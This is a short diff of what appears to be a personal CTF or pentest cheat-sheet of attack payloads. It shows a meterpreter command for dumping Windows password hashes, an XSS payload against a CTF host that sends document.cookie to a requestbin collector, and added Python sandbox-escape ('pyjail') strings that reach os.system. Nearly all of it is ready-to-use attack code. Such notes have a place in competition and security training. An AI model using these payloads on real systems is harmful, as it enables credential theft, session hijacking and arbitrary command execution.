@@ -180,3 +180,7 @@ meterpreter > run post/windows/gather/smart_hashdump
 SigSev2 payload :  
 http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id="</style><iframe%20src=javascript:document.location=%27[requestbin]?c%27.concat(document.cookie)>">  
 
+#Magic payloads pyjail
+().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system()  
+().__class__.__base__.__subclasses__()[59].__init__.im_func.func_globals["linecache"].os.system()  
+
